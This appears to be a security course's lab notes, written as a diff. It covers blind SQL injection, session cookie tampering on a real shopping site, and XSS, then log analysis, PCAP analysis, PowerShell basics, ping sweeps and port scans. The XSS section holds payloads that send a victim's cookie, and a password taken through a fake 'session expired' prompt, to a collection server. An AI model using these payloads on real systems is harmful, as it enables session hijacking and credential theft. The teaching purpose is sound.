+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+################################
+# Playing with session cookies #
+################################
+ 
+-----------------------------------------------------------------------
+Step 1: Browse to NewEgg.com
+-------------------------Paste this into Firefox-----------------------------------
+https://secure.newegg.com/
+----------------------------------------------------------------------------------
+ 
+ 
+Step 2: Browse to the shopping cart page NewEgg.com
+-------------------------Paste this into Firefox-----------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+----------------------------------------------------------------------------------
+ 
+ 
+Step 3: View the current session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.write(document.cookie))
+------------------------------------------------------------------------------------
+ 
+Step 4: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+Step 5: Now let's modify the session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.cookie="PHPSessionID=wow-this-is-fun")
+------------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 6: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 7: View the current session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.write(document.cookie))
+------------------------------------------------------------------------------------
+ 
+-----------------------------------------------------------------------
+ 
+###########################################
+# What is XSS                             #
+# http://45.63.104.73/2-Intro_To_XSS.pptx #
+###########################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+   http://45.63.104.73/xss_practice/
+-----------------------------------------------------------------------
+ 
+   A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+---------------------------Type This-----------------------------------
+ 
+   <script>alert('So this is XSS')</script>
+-----------------------------------------------------------------------
+ 
+ 
+   This should pop-up an alert window with your message in it proving XSS is in fact possible.
+   Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+---------------------------Type This-----------------------------------
+ 
+   <script>alert(document.cookie)</script>
+-----------------------------------------------------------------------
+ 
+ 
+   This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+   Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+---------------------------Type This-----------------------------------
+ 
+   <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+-----------------------------------------------------------------------
+ 
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+ 
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+-----------------------------------------------------------------------
+ 
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+   http://45.63.104.73/xss_practice/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-----------------------------------------------------------------------
+ 
+ 
+Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+ 
+   http://45.63.104.73/xss_practice/passwords.html
+ 
+-----------------------------------------------------------------------
+
+###############################################################
+# Question 1: What is the process that you use when you test? #
+###############################################################
+ 
+Step 1: Automated Testing
+ 
+Step 1a: Web Application vulnerability scanners
+-----------------------------------------------
+- Run two (2) unauthenticated vulnerability scans against the target
+- Run two (2) authenticated vulnerability scans against the target with low-level user credentials
+- Run two (2) authenticated vulnerability scans against the target with admin privileges
+ 
+The web application vulnerability scanners that I use for this process are (HP Web Inspect, and Acunetix).
+ 
+A good web application vulnerability scanner comparison website is here:
+http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html
+ 
+ 
+Look to see if there are cases where both scanners identify the same vulnerability. Investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+When you run into cases where one (1) scanner identifies a vulnerability that the other scanner does not you should still investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+ 
+Be sure to look for scans that take more than 3 or 4 hours as your scanner may have lost its active session and is probably not actually finding real vulnerabilities anymore.
+ 
+ 
+Also, be sure to save the scan results and logs. I usually provide this data to the customer.
+ 
+ 
+ 
+Step 1b: Directory Brute Forcer
+-------------------------------
+I like to run DirBuster or a similar tool. This is great to find hidden gems (backups of the website, information leakage, unreferenced files, dev sites, etc).
+ 
+ 
+ 
+Step 2: Manual Testing
+ 
+Try to do this step while your automated scans are running. Use Burp Suite or the Tamper Data Firefox extension to browse EVERY PAGE of the website (if this is realistic).
+ 
+Step 2a: Spider/Scan the entire site with Burp Suite
+Save the spider and scan results. I usually provide this data to the customer as well.
+ 
+ 
+Step 2b: Browse through the site using the 3 question method
+Have Burp Suite on with intercept turned off. Browse the website using the 3 question method that I've taught you in the past. When you find a place in the site where the answer to one of the 3 questions is yes - be sure to look at that individual web request in the target section of Burp Suite, right-click on that particular request and choose 'Send to Intruder'.
+ 
+Take the appropriate fuzz list from https://github.com/fuzzdb-project/fuzzdb/ and load it into Intruder. A quick tip for each individual payload is to be sure to send the payload both with and without the parameter value.
+ 
+Here is what I mean:
+http://www.site.com/page.aspx?parametername=parametervalue
+ 
+When you are looking at an individual request - often times Burp Suite will insert the payload in place of the parameter value like this:
+ 
+http://www.site.com/page.aspx?parametername=[ payload ]
+ 
+You need to ensure that you send the payload this way, and like this below:
+ 
+http://www.site.com/page.aspx?parametername=parametervalue[ payload ]
+ 
+This little hint will pay huge dividends in actually EXPLOITING the vulnerabilities you find instead of just identifying them.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###########################################
+# Question 2: How much fuzzing is enough? #
+###########################################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+ 
+ 
+ 
+#######################
+# Bug Bounty Programs #
+#######################
+https://medium.com/bugbountywriteup/bug-bounty-hunting-methodology-toolkit-tips-tricks-blogs-ef6542301c65
+ 
+ 
+############################
+# Bug Hunter's Methodology #
+############################
+https://www.youtube.com/watch?v=C4ZHAdI8o1w
+https://www.youtube.com/watch?v=-FAjxUOKbdI
+
+
+
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+ 
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+ 
+ 
+##############
+# Cisco Logs #
+##############
+ 
+-----------------------------Type this-----------------------------------------
+wget http://45.63.104.73/cisco.log
+-------------------------------------------------------------------------------
+ 
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}' | tail -n 4
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+--------------------------------------------------------------------------------
+
+
+##################################################################
+# Analyzing a PCAP Prads                                         #
+# Note: run as regular user                                      #
+##################################################################
+ 
+---------------------------Type this as a regular user----------------------------------
+cd ~
+ 
+cd ~/pcap_analysis/prads
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+prads -r suspicious-time.pcap -l prads-asset.log
+ 
+cat prads-asset.log | less
+ 
+cat prads-asset.log | grep SYN | grep -iE 'windows|linux'
+ 
+cat prads-asset.log | grep CLIENT | grep -iE 'safari|firefox|opera|chrome'
+ 
+cat prads-asset.log | grep SERVER | grep -iE 'apache|linux|ubuntu|nginx|iis'
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################
+# PCAP Analysis with ChaosReader #
+# Note: run as regular user      #
+##################################
+---------------------------Type this as a regular user----------------------------------
+cd ~
+ 
+cd ~/pcap_analysis/chaos_reader/
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+wget http://45.63.104.73/chaosreader.pl
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+ 
+python -m SimpleHTTPServer    
+          ****** Open a web browser and browse the the IP address of your Linux machine port 8000 for the web page *****
+ 
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+If you are interested in running PowerShell on Mac OS X, or Linux you can check out the following link:
+https://www.howtogeek.com/267858/how-to-install-microsoft-powershell-on-linux-or-os-x/
+ 
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell. Make sure that you run it as an administrator
+ 
+------------------------Type This------------------------------
+cd c:\
+dir
+cd
+ls
+---------------------------------------------------------------
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+------------------------Type This------------------------------
+Get-Command
+---------------------------------------------------------------
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+------------------------Type This------------------------------
+Get-Alias
+---------------------------------------------------------------
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+------------------------Type This------------------------------
+Get-Process | stop-process              Don't press [ ENTER ] What will this command do?
+Get-Process | stop-process -whatif
+---------------------------------------------------------------
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+------------------------Type This------------------------------
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- Run cmdlet through a pie and refer to its properties as $_
+------------------------Type This------------------------------
+Get-Service | where-object {  $_.Status -eq "Running"}
+---------------------------------------------------------------
+ 
+ 
+ 
+- PowerShell variables begin with the $ symbol. First lets create a variable
+------------------------Type This------------------------------
+$serv = Get-Service –N Spooler
+---------------------------------------------------------------
+ 
+To see the value of a variable you can just call it in the terminal.
+------------------------Type This------------------------------
+$serv
+ 
+$serv.gettype().fullname
+---------------------------------------------------------------
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+------------------------Type This------------------------------
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Let's use a method and a property with our object.
+------------------------Type This------------------------------
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+---------------------------------------------------------------
+ 
+ 
+If you want some good command-line shortcuts you can check out the following link:
+https://technet.microsoft.com/en-us/library/ff678293.aspx
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+Let's setup a directory to work in:
+------------------------Type This------------------------------
+cd c:\
+ 
+mkdir ps
+ 
+cd ps
+---------------------------------------------------------------
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+------------------------Type This------------------------------
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+---------------------------------------------------------------
+ 
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+------------------------Type This------------------------------
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+------------------------Type This------------------------------
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+---------------------------------------------------------------
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+------------------------Type This------------------------------
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+---------------------------------------------------------------
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+
+I had another student ask me if we can go back in hours instead of days and the answer is yes.
+------------------------Type This------------------------------
+Get-EventLog Application -After (Get-Date).AddHours(-1)
+---------------------------------------------------------------
+ 
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+------------------------Type This------------------------------
+$seclog | select -first 1 | fl *
+---------------------------------------------------------------
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+------------------------Type This------------------------------
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+---------------------------------------------------------------
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+---------------------------------------------------------------
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+---------------------------------------------------------------
+ 
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
+------------------------Type This------------------------------
+$seclog.Count
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+------------------------Type This------------------------------
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+---------------------------------------------------------------
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+---------------------------------------------------------------
+ 
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+---------------------------------------------------------------
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+---------------------------------------------------------------
+ 
+ 
+ 
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+ 
+Download the sample IIS log http://pastebin.com/LBn64cyA
+ 
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+---------------------------------------------------------------
+ 
+ 
+The above command would give us all the WebDAV requests.
+ 
+To filter this to a particular user name, use the below command:
+------------------------Type This------------------------------
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+---------------------------------------------------------------
+ 
+ 
+Some more options that will be more commonly required :
+ 
+For Outlook Web Access : Replace WebDAV with OWA
+ 
+For EAS : Replace WebDAV with Microsoft-server-activesync
+ 
+For ECP : Replace WebDAV with ECP
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+####################################################################
+# Windows PowerShell: Extracting Strings Using Regular Expressions #
+####################################################################
+ 
+ 
+Regex Characters you might run into:
+ 
+^   Start of string, or start of line in a multiline pattern
+$   End  of string, or start of line in a multiline pattern
+\b  Word boundary
+\d  Digit
+\   Escape the following character
+*   0 or more   {3} Exactly 3
++   1 or more   {3,}    3 or more
+?   0 or 1      {3,5}   3, 4 or 5
+ 
+ 
+ 
+To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:
+ 
+1) The input file that will be parsed
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
+---------------------------------------------------------------
+2) The regular expression that the input file will be compared against
+ 
+3) The output file for where the extracted data will be placed.
+ 
+Windows PowerShell has a "select-string" cmdlet which can be used to quickly scan a file to see if a certain string value exists.
+Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.
+ 
+To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\emails.txt'
+$output_file = 'c:\ps\extracted_addresses.txt'
+$regex = '\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+In this script, we have the following variables:
+ 
+1) $input_path to hold the path to the input file we want to parse
+ 
+2) $output_file to hold the path to the file we want the results to be stored in
+ 
+3) $regex to hold the regular expression pattern to be used when the strings are being matched.
+ 
+The select-string cmdlet contains various parameters as follows:
+ 
+1) "-Path" which takes as input the full path to the input file
+ 
+2) "-Pattern" which takes as input the regular expression used in the matching process
+ 
+3) "-AllMatches" which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to "$.Matches" and then "$_.Value" which represent using the current values of all the matches.
+ 
+Using ">" the results are written to the destination specified in the $output_file variable.
+ 
+Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.
+ 
+IP addresses
+------------
+For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\ip_addresses.txt'
+$output_file = 'c:\ps\extracted_ip_addresses.txt'
+$regex = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+ 
+URLs
+----
+For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt.
+You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\URL_addresses.txt'
+$output_file = 'c:\ps\extracted_URL_addresses.txt'
+$regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+In addition to the examples above, many other types of strings can be extracted using this script.
+All you need to do is switch the regular expression in the "$regex" variable!
+In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Basic Network Commands in PowerShell #
+########################################
+ 
+Reference:
+https://blogs.technet.microsoft.com/josebda/2015/04/18/windows-powershell-equivalents-for-common-networking-commands-ipconfig-ping-nslookup/
+ 
+ 
+###################
+# Pentester Tasks #
+###################
+Reference:
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
+ 
+ 
+Listing IPs
+-----------
+One of the typical ways for working with IP addressed in most scripts is to work with an octet and then increase the last one
+ 
+------------------------Type This------------------------------
+$octect = "149.28.201."
+$lastoctect = (1..255)
+$lastoctect | ForEach-Object {write-host "$($octect)$($_)"}
+---------------------------------------------------------------
+ 
+ 
+Ping Sweep
+------------------------------------------------------
+PowerShell provides several methods for doing Ping
+Test-Connection cmdlet
+Creation of a WMI Object
+.Net System.Net.NetworkInformation.Ping Object
+------------------------------------------------------
+ 
+ 
+------------------------Type This------------------------------
+function New-IPRange ($start, $end) {
+$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
+[Array]::Reverse($ip1)
+$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
+ 
+$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
+[Array]::Reverse($ip2)
+$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
+ 
+for ($x=$ip1; $x -le $ip2; $x++) {
+$ip = ([System.Net.IPAddress]$x).GetAddressBytes()
+[Array]::Reverse($ip)
+$ip -join '.'
+}
+}
+$ping = New-Object System.Net.NetworkInformation.Ping
+New-IPRange 149.28.201.1 149.28.201.250 | ForEach-Object {$ping.Send($_, 100)} | where {$_.status -eq "Success"}
+---------------------------------------------------------------
+ 
+ 
+Reverse Lookups
+---------------
+For reverse lookups using .Net Class we use the [System.Net.Dns]::GetHostEntry(IP) method Returns System.Net.IPHostEntry
+ 
+ 
+------Deprecated--------
+[System.Net.Dns]::GetHostByAddress("162.243.126.247")  
+------Deprecated--------
+ 
+Use getnameinfo instead:
+https://msdn.microsoft.com/en-us/library/windows/desktop/ms738532(v=vs.85).aspx
+ 
+References:
+https://stackoverflow.com/questions/10346194/how-to-use-getnameinfo-instead-of-gethostbyname
+ 
+ 
+ 
+Forward Lookups
+---------------
+ 
+------------------------Type This------------------------------
+[System.Net.Dns]::GetHostAddresses("www.google.com")
+---------------------------------------------------------------
+ 
+ 
+Port Scans
+----------
+To test if a port is open on a remote host in PowerShell the best method is to use the .Net abstraction that it provides to Windows Socket library
+For TCP the .Net System.Net.Sockets.TcpClient
+For UDP the .Net System.Net.Sockets.UdpClient
+ 
+ 
+ 
+ 
+TCP Scan (Windows 7)
+--------------------
+NOTE: If you are using Windows 7, use the code below
+------------------------Type This------------------------------
+$ports=22,80,443,3389
+$target = "149.28.201.171"
+foreach ($i in $ports) {
+try {
+$socket = new-object System.Net.Sockets.TCPClient($target, $i);
+} catch {}
+if ($socket -eq $NULL) {
+echo "$target:$i - Closed";
+} else {
+echo "$target:$i - Open";
+$socket = $NULL;
+}}
+---------------------------------------------------------------
+ 
+ 
+ 
+TCP Scan (Windows 10)
+---------------------
+NOTE: If you are using Windows 10, use the code below
+ 
+------------------------Type This------------------------------
+$ports=22,80,443,3389
+$target = "149.28.201.171"
+foreach ($i in $ports) {
+try {
+$socket = new-object System.Net.Sockets.TCPClient($target, $i);
+} catch {}
+if ($socket -eq $NULL) {
+echo "${target}:$i - Closed";
+} else {
+echo "${target}:$i - Open";
+$socket = $NULL;
+}}
+---------------------------------------------------------------
+ 
+ 
+ 
+##########################
+# Parsing Nmap XML Files #
+##########################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://infosecaddicts-files.s3.amazonaws.com/PowerShell-Files.zip
+ 
+ 
+Let's setup a directory to work in:
+------------------------Type This------------------------------
+cd c:\
+ 
+mkdir ps
+ 
+cd ps
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+------------------------Type This------------------------------
+cd c:\ps
+mkdir PowerShell-Files
+cd PowerShell-Files
+(new-object System.Net.WebClient).DownloadFile("https://infosecaddicts-files.s3.amazonaws.com/Parse-Nmap.ps1", "c:\ps\PowerShell-Files\Parse-Nmap.ps1")
+(new-object System.Net.WebClient).DownloadFile("https://infosecaddicts-files.s3.amazonaws.com/class_nessus.csv", "c:\ps\PowerShell-Files\class_nessus.csv")
